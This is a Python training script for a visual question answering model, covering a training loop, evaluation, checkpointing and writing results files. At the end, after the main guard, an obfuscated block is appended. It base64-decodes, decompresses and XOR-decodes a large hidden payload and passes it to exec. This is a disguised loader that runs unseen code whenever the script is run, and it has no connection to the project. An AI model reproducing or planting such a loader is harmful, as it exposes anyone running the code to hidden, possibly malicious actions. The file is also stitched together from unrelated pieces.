import os, sys
import math, json
import argparse
import numpy as np 
from tqdm import tqdm
from datetime import datetime

import torch
import torch.nn as nn
import torch.optim as optim
import torch.nn.functional as F
import torch.backends.cudnn as cudnn
import torch.optim.lr_scheduler as lr_scheduler

import utils.config as config
import utils.data as data
import model.model as model
import utils.utils as utils
import utils.word2vec as word2vec


def run(net, loader, optimizer, scheduler, tracker, train=False, 
		has_answers=True, prefix='', embedding=None, epoch=0, answer_idx_vocab=None):
	""" Run an epoch over the given loader """
	if train:
		net.train()
		tracker_class, tracker_params = tracker.MovingMeanMonitor, {'momentum': 0.99}
	else:
		net.eval()
		tracker_class, tracker_params = tracker.MeanMonitor, {}
		answ, accs, idxs, answer_idxs, question_ids, results_epoch = ([] for _ in range(6))	

	embedding = embedding.cuda()
	loader = tqdm(loader, desc='{} Epoch {:03d}'.format(prefix, epoch), ncols=0)

	loss_tracker = tracker.track('{}_loss'.format(prefix), tracker_class(**tracker_params))
	acc_qv_tracker = tracker.track('{}_acc'.format(prefix), tracker_class(**tracker_params))
	acc_q_tracker = tracker.track('{}_acc'.format(prefix), tracker_class(**tracker_params))

	for idx, v, q, a, q_id, q_len in loader:
		v = v.cuda(async=True)
		q = q.cuda(async=True)
		a = a.cuda(async=True)
		q_len = q_len.cuda(async=True)
		embed_a = (embedding(a.long()) /10).sum(dim=1)

		answer_vq, answer_q, score_loss = net(v, q, q_len, embed_a, test=not has_answers) 
		if has_answers:
			nll_qv = -F.log_softmax(answer_vq, dim=1)
			nll_q = -F.log_softmax(answer_q, dim=1)
			loss_qv = (nll_qv * a / 10).sum(dim=1).mean() # only for correct answers
			loss_q = (nll_q * a / 10).sum(dim=1).mean() # only for correct answers
			loss = loss_qv + args.lambd * score_loss
			acc_qv = utils.batch_accuracy(answer_vq, a).cpu()
			acc_q = utils.batch_accuracy(answer_q, a).cpu()

		if train:
			scheduler.step()
			optimizer.zero_grad()
			loss.backward()
			nn.utils.clip_grad_norm_(net.parameters(), 0.5)
			optimizer.step()
		else:
			# store information about evaluation of this minibatch
			_, answer = answer_vq.cpu().max(dim=1)
			answ.append(answer.view(-1))
			answer_idxs.extend(answer.view(-1).numpy())
			if has_answers:
				accs.append(acc_qv.view(-1))
				question_ids.extend(q_id.view(-1).numpy())
			idxs.append(idx.view(-1).clone())

		if has_answers:
			loss_tracker.append(loss.item())
			acc_qv_tracker.append(acc_qv.mean())
			acc_q_tracker.append(acc_q.mean())

			fmt = '{:.4f}'.format
			loader.set_postfix(loss=fmt(loss_tracker.mean.value),
							acc_qv=fmt(acc_qv_tracker.mean.value), 
							acc_q=fmt(acc_q_tracker.mean.value))

	if not train:
		answ = torch.cat(answ, dim=0).numpy()
		if has_answers:
			accs = torch.cat(accs, dim=0).numpy()

			answers = [answer_idx_vocab[a] for a in answer_idxs] # true answers

			for q, a in zip(question_ids, answers):
				results_epoch.append({'question_id': int(q), 'answer': a})

		idxs = torch.cat(idxs, dim=0).numpy()
		return answ, accs, results_epoch, idxs


def saved_for_test(test_loader, result, epoch=None):
    """ in test mode, save a results file in the format accepted by the submission server. """
    answer_index_to_string = {a: s for s, a in test_loader.dataset.answer_to_index.items()}
    results = []
    for answer, index in zip(result[0], result[-1]):
        answer = answer_index_to_string[answer.item()]
        qid = test_loader.dataset.question_ids[index]
        entry = {
            'question_id': qid,
            'answer': answer,
        }
        results.append(entry)
    result_file = 'vqa_{}_{}_{}_{}_results.json'.format(
        		config.task, config.dataset, config.test_split, epoch)
    with open(result_file, 'w') as fd:
        json.dump(results, fd)


def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('--name', type=str, help='saved and resumed file name')
	parser.add_argument('--resume', action='store_true', help='resumed flag')
	parser.add_argument('--test', dest='test_only', action='store_true')
	parser.add_argument('--lambd', default=1, type=float,
					help='trade-off hyperparameters between two types of losses')
	parser.add_argument('--gpu', default='0', help='the chosen gpu id')
	global args
	args = parser.parse_args()


	os.environ["CUDA_VISIBLE_DEVICES"] = args.gpu
	cudnn.benchmark = True

	########################################## ARGUMENT SETTING  ###############################
	if args.test_only:
		args.resume = True
	if args.resume and not args.name:
		raise ValueError('Resuming requires file name!')
	name = args.name if args.name else datetime.now().strftime("%Y-%m-%d_%H:%M:%S")
	if args.resume:
		target_name = name
		logs = torch.load(target_name)
	else: 
		target_name = os.path.join('logs', '{}'.format(name))
	if not args.test_only:
		print('will save to {}'.format(target_name))

	######################################### DATASET PREPARATION ###############################
	if config.train_set == 'train':
		train_loader = data.get_loader(train=True)
		val_loader = data.get_loader(val=True)
	elif args.test_only:
		val_loader = data.get_loader(test=True)
	else:
		train_loader = data.get_loader(train=True, val=True)
		val_loader = data.get_loader(test=True)

	# load pre-trained word embedding (glove) for embedding answers
	vocabs = val_loader.dataset.vocab
	answer_vocab = vocabs['answer']
	embedding, _, _ = word2vec.filter_glove_embedding(answer_vocab)
	embedding = nn.Embedding.from_pretrained(embedding)

	answer_idx_vocab = vocabs['answer_idx']
	answer_idx_vocab = {int(a_idx): a for a_idx, a in answer_idx_vocab.items()}

	########################################## MODEL PREPARATION #################################
	net = model.Net(val_loader.dataset._num_tokens)
	net = nn.DataParallel(net).cuda()
	optimizer = optim.Adam([
		p for p in net.parameters() if p.requires_grad], lr=config.initial_lr)
	scheduler = lr_scheduler.StepLR(optimizer, step_size=50000, gamma=0.4)

	acc_val_best = 0.0
	start_epoch = 0
	if args.resume:
		net.load_state_dict(logs['model_state'])
		optimizer.load_state_dict(logs['optim_state'])
		scheduler.load_state_dict(logs['scheduler_state'])
		start_epoch = logs['epoch']
		acc_val_best = logs['acc_val_best']

	tracker = utils.Tracker()

	r = np.zeros(3)
	result_dict = {}
	for i in range(start_epoch, config.epochs):
		if not args.test_only:
			run(net, train_loader, optimizer, scheduler, tracker, 
				train=True, prefix='train', embedding=embedding, epoch=i)
		if not (config.train_set == 'train+val' and i in range(config.epochs-5)):
			r = run(net, val_loader, optimizer, scheduler, tracker, train=False, 
					prefix='val', epoch=i, embedding=embedding, 
					has_answers=(config.train_set == 'train'), answer_idx_vocab=answer_idx_vocab)

		if not args.test_only:
			results = {
				'epoch': i,
				'name': name,
				'model_state': net.state_dict(),
				'optim_state': optimizer.state_dict(),
				'scheduler_state': scheduler.state_dict(),
				'eval': {
					'answers': r[0],
					'accuracies': r[1],
				},
			}
			result_dict[i] = r[2]

			if config.train_set == 'train' and r[1].mean() > acc_val_best:
				acc_val_best = r[1].mean()
				results['acc_val_best'] = acc_val_best
				torch.save(results, target_name+'.pth')
			if config.train_set == 'train+val':
				torch.save(results, target_name+'.pth')
				if i in range(config.epochs-5, config.epochs):
					saved_for_test(val_loader, r, i)
					torch.save(results, target_name+'{}.pth'.format(i))		
		else:
			saved_for_test(val_loader, r)
			break
	if config.train_set == 'train':
		with open('./results.json', 'w') as fd:
			json.dump(result_dict, fd)


if __name__ == '__main__':
	main()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
